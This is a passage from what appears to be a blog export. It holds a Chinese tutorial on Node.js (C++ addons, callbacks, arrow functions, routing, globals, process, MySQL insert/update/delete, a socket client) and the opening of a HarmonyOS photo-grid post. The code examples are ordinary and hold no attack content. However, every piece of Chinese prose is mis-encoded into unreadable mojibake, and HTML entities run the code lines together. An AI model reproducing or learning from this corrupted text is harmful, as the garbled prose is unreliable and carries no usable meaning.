è½½è¿™ä¸ªæ¨¡å—ã€‚è¿™å¯ä»¥é€šè¿‡Node.jsçš„åŸç”Ÿæ‰©å±•æ¨¡å—APIå®ç°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡N-APIå®ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸ºæ„å»ºå¯ä»¥åœ¨å¤šä¸ªNode.jsç‰ˆæœ¬ä¸Šå·¥ä½œçš„åŸç”Ÿæ‰©å±•æ¨¡å—è€Œè®¾è®¡çš„APIã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå±•ç¤ºå¦‚ä½•åˆ›å»ºä¸€ä¸ªC++æ‰©å±•æ¨¡å—å¹¶åœ¨Node.jsä¸­ä½¿ç”¨å®ƒã€‚ é¦–å…ˆï¼Œä½ éœ€è¦å®‰è£…ä¸€ä¸ªåä¸ºnode-gypçš„å·¥å…·ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥ç¼–è¯‘C++æ‰©å±•æ¨¡å—çš„å·¥å…·ï¼š npm install -g node-gyp ç„¶åï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºbinding.gypçš„æ–‡ä»¶ï¼Œå®ƒæè¿°äº†å¦‚ä½•æ„å»ºæ‰©å±•æ¨¡å—ï¼š 12345678&#123; &quot;targets&quot;: [ &#123; &quot;target_name&quot;: &quot;addon&quot;, &quot;sources&quot;: [ &quot;addon.cc&quot; ] &#125; ]&#125; æ¥ä¸‹æ¥ï¼Œåˆ›å»ºä¸€ä¸ªC++æºæ–‡ä»¶ï¼Œä¾‹å¦‚addon.ccï¼Œå®ƒåŒ…å«äº†ä½ çš„C++ä»£ç ï¼š 123456789101112131415161718192021222324#include &lt;node.h&gt;namespace demo &#123;using v8::FunctionCallbackInfo;using v8::Isolate;using v8::Local;using v8::NewStringType;using v8::Object;using v8::String;using v8::Value;void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, &quot;world&quot;, NewStringType::kNormal).ToLocalChecked());&#125;void Initialize(Local&lt;Object&gt; exports) &#123; NODE_SET_METHOD(exports, &quot;hello&quot;, Method);&#125;NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)&#125; // namespace demo ç¡®ä¿åœ¨binding.gypæ–‡ä»¶çš„åŒä¸€ç›®å½•ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ„å»ºæ‰©å±•æ¨¡å—ï¼š 1node-gyp configure build è¿™å°†ç”Ÿæˆä¸€ä¸ªç¼–è¯‘å¥½çš„æ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥åœ¨Node.jsä¸­é€šè¿‡requireæ¥åŠ è½½å¹¶ä½¿ç”¨å®ƒï¼š 123const addon = require(&#x27;./build/Release/addon.node&#x27;);console.log(addon.hello()); // è¾“å‡º: world åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒC++æ¨¡å—å¯¼å‡ºäº†ä¸€ä¸ªåä¸ºhelloçš„æ–¹æ³•ï¼Œå½“åœ¨Node.jsä¸­è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œå®ƒè¿”å›å­—ç¬¦ä¸²â€worldâ€ã€‚ ğŸ™‹â€â™€ï¸Node.js å‡½æ•° åœ¨ JavaScriptä¸­ï¼Œä¸€ä¸ªå‡½æ•°å¯ä»¥ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥å…ˆå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åä¼ é€’ï¼Œä¹Ÿå¯ä»¥åœ¨ä¼ é€’å‚æ•°çš„åœ°æ–¹ç›´æ¥å®šä¹‰å‡½æ•°ã€‚ Node.js ä¸­å‡½æ•°çš„ä½¿ç”¨ä¸ JavaScript ç±»ä¼¼ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š 123456789function say(word) &#123; console.log(word);&#125;function execute(someFunction, value) &#123; someFunction(value);&#125;execute(say, &quot;Hello&quot;); ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬æŠŠ say å‡½æ•°ä½œä¸º execute å‡½æ•°çš„ç¬¬ä¸€ä¸ªå˜é‡è¿›è¡Œäº†ä¼ é€’ã€‚è¿™é‡Œä¼ é€’çš„ä¸æ˜¯ say çš„è¿”å›å€¼ï¼Œè€Œæ˜¯ say æœ¬èº«ï¼ è¿™æ ·ä¸€æ¥ï¼Œ say å°±å˜æˆäº†execute ä¸­çš„æœ¬åœ°å˜é‡ someFunction ï¼Œexecute å¯ä»¥é€šè¿‡è°ƒç”¨ someFunction() ï¼ˆå¸¦æ‹¬å·çš„å½¢å¼ï¼‰æ¥ä½¿ç”¨ say å‡½æ•°ã€‚ å½“ç„¶ï¼Œå› ä¸º say æœ‰ä¸€ä¸ªå˜é‡ï¼Œ execute åœ¨è°ƒç”¨ someFunction æ—¶å¯ä»¥ä¼ é€’è¿™æ ·ä¸€ä¸ªå˜é‡ã€‚ åŒ¿åå‡½æ•° 1234567function execute(someFunction, value) &#123; someFunction(value);&#125;execute(function(word)&#123; console.log(word) &#125;, &quot;Hello&quot;); ä¼ é€’ 12345678910var http = require(&quot;http&quot;);function onRequest(request, response) &#123; response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end();&#125;http.createServer(onRequest).listen(8888); &#x3D;&#x3D;&gt; 123456789var http = require(&quot;http&quot;);http.createServer(function(request, response) &#123; response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end();&#125;).listen(8888); ğŸ™‹â€â™‚Node.js ç®­å¤´å‡½æ•° åœ¨Node.jsä¸­ï¼Œç®­å¤´å‡½æ•°æ˜¯ä¸€ç§ç®€æ´å†™æ³•ï¼Œç”¨äºå£°æ˜åŒ¿åå‡½æ•°ã€‚å®ƒä»¬æœ€å¸¸ç”¨äºå›è°ƒå‡½æ•°å’Œäº‹ä»¶ç›‘å¬å™¨ç­‰åœºæ™¯ã€‚ç®­å¤´å‡½æ•°çš„è¯­æ³•å¾ˆç®€å•ï¼Œå®ƒçš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹ï¼š 1234(param1, param2, ...) =&gt; &#123; // å‡½æ•°ä½“ return something;&#125; 123const numbers = [1, 2, 3, 4, 5];const doubled = numbers.map(number =&gt; number * 2);console.log(doubled); // è¾“å‡º: [2, 4, 6, 8, 10] 123setTimeout(() =&gt; &#123; console.log(&#x27;hihihi.&#x27;);&#125;, 2000); ä»¥ä¸Šå†³ç­–å›¾çœ‹èµ·æ¥æœ‰ç‚¹å¤æ‚ï¼Œæˆ‘è®¤ä¸ºæœ‰ä¸‰ç‚¹æ¯”è¾ƒé‡è¦ï¼š ç®­å¤´å‡½æ•°é€‚åˆäºæ— å¤æ‚é€»è¾‘æˆ–è€…æ— å‰¯ä½œç”¨çš„çº¯å‡½æ•°åœºæ™¯ä¸‹ï¼Œä¾‹å¦‚ç”¨åœ¨ map ã€ reduce ã€ filter çš„å›è°ƒå‡½æ•°å®šä¹‰ä¸­ï¼› ä¸è¦åœ¨æœ€å¤–å±‚å®šä¹‰ç®­å¤´å‡½æ•°ï¼Œå› ä¸ºåœ¨å‡½æ•°å†…éƒ¨æ“ä½œ this ä¼šå¾ˆå®¹æ˜“æ±¡æŸ“å…¨å±€ä½œç”¨åŸŸã€‚æœ€èµ·ç åœ¨ç®­å¤´å‡½æ•°å¤–éƒ¨åŒ…ä¸€å±‚æ™®é€šå‡½æ•°ï¼Œå°† this æ§åˆ¶åœ¨å¯è§çš„èŒƒå›´å†…ï¼› å¦‚å¼€å¤´æ‰€è¿°ï¼Œç®­å¤´å‡½æ•°æœ€å¸å¼•äººçš„åœ°æ–¹æ˜¯ç®€æ´ã€‚åœ¨æœ‰å¤šå±‚å‡½æ•°åµŒå¥—çš„æƒ…å†µä¸‹ï¼Œç®­å¤´å‡½æ•°çš„ç®€æ´æ€§å¹¶æ²¡æœ‰å¾ˆå¤§çš„æå‡ï¼Œåè€Œå½±å“äº†å‡½æ•°çš„ä½œç”¨èŒƒå›´çš„è¯†åˆ«åº¦ï¼Œè¿™ç§æƒ…å†µä¸å»ºè®®ä½¿ç”¨ç®­å¤´å‡½æ•°ã€‚ ğŸ§ªNode.js è·¯ç”± åœ¨ Node.js ä¸­ï¼Œè·¯ç”±ï¼ˆRoutingï¼‰æ˜¯æŒ‡ç¡®å®šå¦‚ä½•å“åº”å¯¹ç‰¹å®šç«¯ç‚¹ï¼ˆURL è·¯å¾„ï¼‰çš„ HTTP è¯·æ±‚çš„è¿‡ç¨‹ã€‚ æˆ‘ä»¬è¦ä¸ºè·¯ç”±æä¾›è¯·æ±‚çš„ URL å’Œå…¶ä»–éœ€è¦çš„ GET åŠ POST å‚æ•°ï¼Œéšåè·¯ç”±éœ€è¦æ ¹æ®è¿™äº›æ•°æ®æ¥æ‰§è¡Œç›¸åº”çš„ä»£ç ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ HTTP è¯·æ±‚ï¼Œä»ä¸­æå–å‡ºè¯·æ±‚çš„ URL ä»¥åŠ GET&#x2F;POST å‚æ•°ã€‚è¿™ä¸€åŠŸèƒ½åº”å½“å±äºè·¯ç”±è¿˜æ˜¯æœåŠ¡å™¨ï¼ˆç”šè‡³ä½œä¸ºä¸€ä¸ªæ¨¡å—è‡ªèº«çš„åŠŸèƒ½ï¼‰ç¡®å®å€¼å¾—æ¢è®¨ï¼Œä½†è¿™é‡Œæš‚å®šå…¶ä¸ºæˆ‘ä»¬çš„HTTPæœåŠ¡å™¨çš„åŠŸèƒ½ã€‚ æˆ‘ä»¬éœ€è¦çš„æ‰€æœ‰æ•°æ®éƒ½ä¼šåŒ…å«åœ¨ request å¯¹è±¡ä¸­ï¼Œè¯¥å¯¹è±¡ä½œä¸º onRequest() å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ã€‚ä½†æ˜¯ä¸ºäº†è§£æè¿™äº›æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–çš„ Node.JS æ¨¡å—ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ url å’Œ querystring æ¨¡å—ã€‚ url.parse(string).query | url.parse(string).pathname | | | | | ------ ------------------- http://localhost:8888/start?foo=bar&amp;hello=world â€” â€”â€“ | | | | querystring.parse(queryString)[â€œfooâ€] | | querystring.parse(queryString)[â€œhelloâ€] ç°åœ¨æˆ‘ä»¬æ¥ç»™ onRequest() å‡½æ•°åŠ ä¸Šä¸€äº›é€»è¾‘ï¼Œç”¨æ¥æ‰¾å‡ºæµè§ˆå™¨è¯·æ±‚çš„ URL è·¯å¾„ï¼š router.js 12345function route(pathname) &#123; console.log(&quot;About to route a request for &quot; + pathname);&#125;exports.route = route; server.js 123456789101112131415161718192021var http = require(&quot;http&quot;);var url = require(&quot;url&quot;);function start(route) &#123; function onRequest(request, response) &#123; var pathname = url.parse(request.url).pathname; console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); route(pathname); response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end(); &#125; http.createServer(onRequest).listen(8888); console.log(&quot;Server has started.&quot;);&#125;exports.start = start; 12345//test.jsvar server = require(&quot;./server&quot;);var router = require(&quot;./router&quot;);server.start(router.route); 1node test.js ğŸ™Node.js å…¨å±€å¯¹è±¡ javaScript ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œç§°ä¸ºå…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰ï¼Œå®ƒåŠå…¶æ‰€æœ‰å±æ€§éƒ½å¯ä»¥åœ¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹è®¿é—®ï¼Œå³å…¨å±€å˜é‡ã€‚ åœ¨æµè§ˆå™¨ JavaScript ä¸­ï¼Œé€šå¸¸ window æ˜¯å…¨å±€å¯¹è±¡ï¼Œ è€Œ Node.js ä¸­çš„å…¨å±€å¯¹è±¡æ˜¯ globalï¼Œæ‰€æœ‰å…¨å±€å˜é‡ï¼ˆé™¤äº† global æœ¬èº«ä»¥å¤–ï¼‰éƒ½æ˜¯ global å¯¹è±¡çš„å±æ€§ã€‚ åœ¨ Node.js æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®åˆ° global çš„å±æ€§ï¼Œè€Œä¸éœ€è¦åœ¨åº”ç”¨ä¸­åŒ…å«å®ƒã€‚ å…¨å±€å¯¹è±¡ä¸å…¨å±€å˜é‡ global æœ€æ ¹æœ¬çš„ä½œç”¨æ˜¯ä½œä¸ºå…¨å±€å˜é‡çš„å®¿ä¸»ã€‚æŒ‰ç…§ ECMAScript çš„å®šä¹‰ï¼Œæ»¡è¶³ä»¥ä¸‹æ¡ ä»¶çš„å˜é‡æ˜¯å…¨å±€å˜é‡ï¼š åœ¨æœ€å¤–å±‚å®šä¹‰çš„å˜é‡ï¼› å…¨å±€å¯¹è±¡çš„å±æ€§ï¼› éšå¼å®šä¹‰çš„å˜é‡ï¼ˆæœªå®šä¹‰ç›´æ¥èµ‹å€¼çš„å˜é‡ï¼‰ã€‚ å½“ä½ å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡æ—¶ï¼Œè¿™ä¸ªå˜é‡åŒæ—¶ä¹Ÿä¼šæˆä¸ºå…¨å±€å¯¹è±¡çš„å±æ€§ï¼Œåä¹‹äº¦ç„¶ã€‚éœ€è¦æ³¨ æ„çš„æ˜¯ï¼Œåœ¨ Node.js ä¸­ä½ ä¸å¯èƒ½åœ¨æœ€å¤–å±‚å®šä¹‰å˜é‡ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·ä»£ç éƒ½æ˜¯å±äºå½“å‰æ¨¡å—çš„ï¼Œ è€Œæ¨¡å—æœ¬èº«ä¸æ˜¯æœ€å¤–å±‚ä¸Šä¸‹æ–‡ã€‚ æ³¨æ„ï¼š æœ€å¥½ä¸è¦ä½¿ç”¨ var å®šä¹‰å˜é‡ä»¥é¿å…å¼•å…¥å…¨å±€å˜é‡ï¼Œå› ä¸ºå…¨å±€å˜é‡ä¼šæ±¡æŸ“å‘½åç©ºé—´ï¼Œæé«˜ä»£ç çš„è€¦åˆé£é™©ã€‚ __filename __filename è¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬çš„æ–‡ä»¶åã€‚å®ƒå°†è¾“å‡ºæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„ç»å¯¹è·¯å¾„ï¼Œä¸”å’Œå‘½ä»¤è¡Œå‚æ•°æ‰€æŒ‡å®šçš„æ–‡ä»¶åä¸ä¸€å®šç›¸åŒã€‚ å¦‚æœåœ¨æ¨¡å—ä¸­ï¼Œè¿”å›çš„å€¼æ˜¯æ¨¡å—æ–‡ä»¶çš„è·¯å¾„ã€‚ __dirname __dirname è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬æ‰€åœ¨çš„ç›®å½•ã€‚ setTimeout(cb, ms) setTimeout(cb, ms) å…¨å±€å‡½æ•°åœ¨æŒ‡å®šçš„æ¯«ç§’(ms)æ•°åæ‰§è¡ŒæŒ‡å®šå‡½æ•°(cb)ã€‚ï¼šsetTimeout() åªæ‰§è¡Œä¸€æ¬¡æŒ‡å®šå‡½æ•°ã€‚ clearTimeout(t) clearTimeout( t ) å…¨å±€å‡½æ•°ç”¨äºåœæ­¢ä¸€ä¸ªä¹‹å‰é€šè¿‡ setTimeout() åˆ›å»ºçš„å®šæ—¶å™¨ã€‚ å‚æ•° t æ˜¯é€šè¿‡ setTimeout() å‡½æ•°åˆ›å»ºçš„å®šæ—¶å™¨ã€‚ 12345678function printHello()&#123; console.log( &quot;Hello, World!&quot;);&#125;// ä¸¤ç§’åæ‰§è¡Œä»¥ä¸Šå‡½æ•°var t = setTimeout(printHello, 2000);// æ¸…é™¤å®šæ—¶å™¨clearTimeout(t); æ‰§è¡Œ main.js æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤º: setInterval(cb, ms) setInterval(cb, ms) å…¨å±€å‡½æ•°åœ¨æŒ‡å®šçš„æ¯«ç§’(ms)æ•°åæ‰§è¡ŒæŒ‡å®šå‡½æ•°(cb)ã€‚ è¿”å›ä¸€ä¸ªä»£è¡¨å®šæ—¶å™¨çš„å¥æŸ„å€¼ã€‚å¯ä»¥ä½¿ç”¨ clearInterval(t) å‡½æ•°æ¥æ¸…é™¤å®šæ—¶å™¨ã€‚ setInterval() æ–¹æ³•ä¼šä¸åœåœ°è°ƒç”¨å‡½æ•°ï¼Œç›´åˆ° clearInterval() è¢«è°ƒç”¨æˆ–çª—å£è¢«å…³é—­ã€‚ 1234567function printHello()&#123; console.log( &quot;Hello, World!&quot;);&#125;// ä¸¤ç§’åæ‰§è¡Œä»¥ä¸Šå‡½æ•°setInterval(printHello, 2000); console console ç”¨äºæä¾›æ§åˆ¶å°æ ‡å‡†è¾“å‡ºï¼Œå®ƒæ˜¯ç”± Internet Explorer çš„ JScript å¼•æ“æä¾›çš„è°ƒè¯•å·¥å…·ï¼Œåæ¥é€æ¸æˆä¸ºæµè§ˆå™¨çš„å®æ–½æ ‡å‡†ã€‚ console.log console.info console.error console.warn console.time(label) è¾“å‡ºæ—¶é—´ï¼Œè¡¨ç¤ºè®¡æ—¶å¼€å§‹ã€‚ console.timeEnd(label) ç»“æŸæ—¶é—´ï¼Œè¡¨ç¤ºè®¡æ—¶ç»“æŸã€‚ console.trace 1234567891011121314console.info(&quot;ç¨‹åºå¼€å§‹æ‰§è¡Œï¼š&quot;);var counter = 10;console.log(&quot;è®¡æ•°: %d&quot;, counter);console.time(&quot;è·å–æ•°æ®&quot;);//for(var i = 0; i &lt; 100000; i++ )&#123;&#125;// console.timeEnd(&#x27;è·å–æ•°æ®&#x27;);console.info(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚&quot;) process process æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå³ global å¯¹è±¡çš„å±æ€§ã€‚ 1234567891011process.on(&#x27;exit&#x27;, function(code) &#123; // ä»¥ä¸‹ä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ setTimeout(function() &#123; console.log(&quot;è¯¥ä»£ç ä¸ä¼šæ‰§è¡Œ&quot;); &#125;, 0); console.log(&#x27;é€€å‡ºç ä¸º:&#x27;, code);&#125;);console.log(&quot;ç¨‹åºæ‰§è¡Œç»“æŸ&quot;); Process å±æ€§ Process æä¾›äº†å¾ˆå¤šæœ‰ç”¨çš„å±æ€§ï¼Œä¾¿äºæˆ‘ä»¬æ›´å¥½çš„æ§åˆ¶ç³»ç»Ÿçš„äº¤äº’ stdout æ ‡å‡†è¾“å‡ºæµ stderr æ ‡å‡†é”™è¯¯æµã€‚ stdin æ ‡å‡†è¾“å…¥æµã€‚ argv argv å±æ€§è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œç”±å‘½ä»¤è¡Œæ‰§è¡Œè„šæœ¬æ—¶çš„å„ä¸ªå‚æ•°ç»„æˆã€‚å®ƒçš„ç¬¬ä¸€ä¸ªæˆå‘˜æ€»æ˜¯nodeï¼Œç¬¬äºŒä¸ªæˆå‘˜æ˜¯è„šæœ¬æ–‡ä»¶åï¼Œå…¶ä½™æˆå‘˜æ˜¯è„šæœ¬æ–‡ä»¶çš„å‚æ•°ã€‚ execPath è¿”å›æ‰§è¡Œå½“å‰è„šæœ¬çš„ Node äºŒè¿›åˆ¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚ execArgv è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯å‘½ä»¤è¡Œä¸‹æ‰§è¡Œè„šæœ¬æ—¶ï¼Œåœ¨Nodeå¯æ‰§è¡Œæ–‡ä»¶ä¸è„šæœ¬æ–‡ä»¶ä¹‹é—´çš„å‘½ä»¤è¡Œå‚æ•°ã€‚ env è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œæˆå‘˜ä¸ºå½“å‰ shell çš„ç¯å¢ƒå˜é‡ exitCode è¿›ç¨‹é€€å‡ºæ—¶çš„ä»£ç ï¼Œå¦‚æœè¿›ç¨‹ä¼˜é€šè¿‡ process.exit() é€€å‡ºï¼Œä¸éœ€è¦æŒ‡å®šé€€å‡ºç ã€‚ version Node çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚v0.10.18 config ä¸€ä¸ªåŒ…å«ç”¨æ¥ç¼–è¯‘å½“å‰ node æ‰§è¡Œæ–‡ä»¶çš„ javascript é…ç½®é€‰é¡¹çš„å¯¹è±¡ã€‚å®ƒä¸è¿è¡Œ .&#x2F;configure è„šæœ¬ç”Ÿæˆçš„ â€œconfig.gypiâ€ æ–‡ä»¶ç›¸åŒã€‚ pid å½“å‰è¿›ç¨‹çš„è¿›ç¨‹å·ã€‚ title è¿›ç¨‹åï¼Œé»˜è®¤å€¼ä¸ºâ€nodeâ€ï¼Œå¯ä»¥è‡ªå®šä¹‰è¯¥å€¼ã€‚ platform è¿è¡Œç¨‹åºæ‰€åœ¨çš„å¹³å°ç³»ç»Ÿ â€˜darwinâ€™, â€˜freebsdâ€™, â€˜linuxâ€™, â€˜sunosâ€™ æˆ– â€˜win32â€™ arch å½“å‰ CPU çš„æ¶æ„ï¼šâ€™armâ€™ã€â€™ia32â€™ æˆ–è€… â€˜x64â€™ã€‚ mainModule require.main çš„å¤‡é€‰æ–¹æ³•ã€‚ä¸åŒç‚¹ï¼Œå¦‚æœä¸»æ¨¡å—åœ¨è¿è¡Œæ—¶æ”¹å˜ï¼Œrequire.mainå¯èƒ½ä¼šç»§ç»­è¿”å›è€çš„æ¨¡å—ã€‚å¯ä»¥è®¤ä¸ºï¼Œè¿™ä¸¤è€…å¼•ç”¨äº†åŒä¸€ä¸ªæ¨¡å—ã€‚ 1234567891011121314151617// è¾“å‡ºåˆ°ç»ˆç«¯process.stdout.write(&quot;Hello World!&quot; + &quot;\\n&quot;);// é€šè¿‡å‚æ•°è¯»å–process.argv.forEach(function(val, index, array) &#123; console.log(index + &#x27;: &#x27; + val);&#125;);// è·å–æ‰§è¡Œè·¯å¾„console.log(process.execPath);// å¹³å°ä¿¡æ¯console.log(process.platform);// è¾“å‡ºå½“å‰ç›®å½•console.log(&#x27;å½“å‰ç›®å½•: &#x27; + process.cwd());// è¾“å‡ºå½“å‰ç‰ˆæœ¬console.log(&#x27;å½“å‰ç‰ˆæœ¬: &#x27; + process.version);// è¾“å‡ºå†…å­˜ä½¿ç”¨æƒ…å†µconsole.log(process.memoryUsage()); ğŸ”­Node.js MySQL 1npm install mysql select 1234567891011121314151617181920212223242526272829var mysql = require(&#x27;mysql&#x27;); var connection = mysql.createConnection(&#123; host : &#x27;localhost&#x27;, user : &#x27;root&#x27;, password : &#x27;123456789&#x27;, //pwd port: &#x27;30306&#x27;, database: &#x27;IMDB&#x27; &#125;); connection.connect();var sql = &#x27;SELECT * FROM IMConfig;&#x27;;console.log(sql);//æŸ¥connection.query(sql,function (err, result) &#123; if(err)&#123; console.log(&#x27;[SELECT ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------SELECT----------------------------&#x27;); console.log(result); console.log(&#x27;------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); ERROR 1045 (28000): Access denied for user â€˜rootâ€˜@â€˜localhostâ€˜ (using password: YES) è¿™è¾¹æ˜¯é€šè¿‡dockerå®‰è£…çš„mysqlï¼Œç™»å½•æŠ¥é”™ root@f4a3881e5f06:&#x2F;# mysql -uroot -p Enter password: 123456 ERROR 1045 (28000): Access denied for user â€˜rootâ€˜@â€™localhostâ€™ (using password: YES) å¦‚æœå¸¸è§„çš„å‘½ä»¤ mysql -uroot -pæ— æ³•ç™»å½•ï¼Œä½¿ç”¨å‘½ä»¤å°è¯•ï¼š mysql -u root -h 127.0.0.1 -p Error: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested mysql -u root -p ALTER USER â€˜rootâ€˜@â€™%â€™ IDENTIFIED WITH mysql_native_password BY â€˜123456789â€™; flush privileges; insert 123456789101112131415161718192021222324connection.connect();var addSql = &#x27;INSERT INTO IMConfig(ConfigID,UserID,ConfigName,ConfigCreateTime,ConfigType,ConfigSn) VALUES(0,?,?,?,?,?)&#x27;;var addSqlParams = [&#x27;1&#x27;, &#x27;11&#x27;,&#x27;2023-01-01&#x27;, &#x27;1&#x27;,&#x27;1&#x27;];//å¢connection.query(addSql,addSqlParams,function (err, result) &#123; if(err)&#123; console.log(&#x27;[INSERT ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------INSERT----------------------------&#x27;); //console.log(&#x27;INSERT ID:&#x27;,result.insertId); console.log(&#x27;INSERT ID:&#x27;,result); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); ER_NO_SUCH_TABLE: Table â€˜IMDB.IMCONFIGâ€™ doesnâ€™t exist ä¸­è‹±æ–‡é”™è¯¯ ER_WRONG_VALUE_COUNT_ON_ROW: Column count doesnâ€™t match value count at row 1 å­—æ®µé”™è¯¯ ER_TRUNCATED_WRONG_VALUE: Incorrect datetime value: â€˜2023-01-01T16:00:00.000Zâ€™ for column â€˜ConfigCreateTimeâ€™ at row 1 å­—æ®µç±»å‹ update 1234567891011121314151617181920//update connection.connect();var modSql = &#x27;UPDATE IMConfig SET ConfigName = ?,ConfigType = ?,ConfigSn = ? WHERE ConfigId = ?&#x27;;var modSqlParams = [&#x27;lang&#x27;, &#x27;2&#x27;,&#x27;1&#x27;,5];//æ”¹connection.query(modSql,modSqlParams,function (err, result) &#123; if(err)&#123; console.log(&#x27;[UPDATE ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------UPDATE----------------------------&#x27;); console.log(&#x27;UPDATE affectedRows&#x27;,result.affectedRows); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;);&#125;);connection.end(); delete 12345678910111213141516171819connection.connect();var delSql = &#x27;DELETE FROM IMConfig where ConfigID=5&#x27;;//åˆ connection.query(delSql,function (err, result) &#123; if(err)&#123; console.log(&#x27;[DELETE ERROR] - &#x27;,err.message); return; &#125; console.log(&#x27;--------------------------DELETE----------------------------&#x27;); console.log(&#x27;DELETE affectedRows&#x27;,result.affectedRows); console.log(&#x27;-----------------------------------------------------------------\\n\\n&#x27;); &#125;);connection.end(); ğŸ§µNode.js Socket socket client 123456789101112131415//skvar net = require(&#x27;net&#x27;);var client = net.connect(&#x27;6001&#x27;, &#x27;xxxx&#x27;, function()&#123; console.log(&#x27;å·²ç»ä¸æœåŠ¡å™¨è¿æ¥&#x27;); client.write(&#x27;Yes\\r\\n&#x27;);&#125;);client.on(&#x27;data&#x27;, function(data)&#123; console.log(data.toString()); client.end();//one msg end&#125;);client.on(&#x27;end&#x27;, function()&#123; console.log(&#x27;å®¢æˆ·ç«¯è¿æ¥ä¸­æ–­&#x27;);&#125;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"event","slug":"event","permalink":"https://banjinmei.github.io/tags/event/"},{"name":"buffer","slug":"buffer","permalink":"https://banjinmei.github.io/tags/buffer/"},{"name":"stream","slug":"stream","permalink":"https://banjinmei.github.io/tags/stream/"},{"name":"c++","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"router","slug":"router","permalink":"https://banjinmei.github.io/tags/router/"}],"author":"mu"},{"title":"HarmonyOS Photos Column Swiper Grid","slug":"HarmonyOS-Photos","date":"2024-05-15T17:26:18.000Z","updated":"2024-12-15T05:10:25.304Z","comments":true,"path":"2024/05/16/HarmonyOS-Photos/","permalink":"https://banjinmei.github.io/2024/05/16/HarmonyOS-Photos/","excerpt":"","text":"â€‹ âœ¨ï¸indextitle swiper list(grid) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import coms from &#x27;../pages/com&#x27;@Entry@Componentstruct Index &#123; @State message: string = &#x27;Hello World1&#x27;//private list = new con build() &#123; Column() &#123; //æ ‡é¢˜ Row()&#123; Text(&#x27;photos&#x27;) .fontSize(&#x27;30fp&#x27;) .fontWeight(FontWeight.Bold) &#125; .justifyContent(FlexAlign.Start) .width(&#x27;100%&#x27;) .padding(&#x27;12vp&#x27;) //è½®æ’­ Swiper() &#123; ForEach(coms.SWIPERLIST,(item:Resource,index?:Number)=&gt;&#123; Row() &#123; Image(item) &#125; .width(&#x27;100%&#x27;) .aspectRatio(1.6) &#125;) &#125; .autoPlay(true) .loop(true) .indicator(true) .duration(1000) .itemSpace(10) .borderRadius(&#x27;12vp&#x27;) .margin(&#x27;12vp&#x27;) .onChange((index: number) =&gt; &#123; &#125;) //åˆ—è¡¨ Grid()&#123; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) 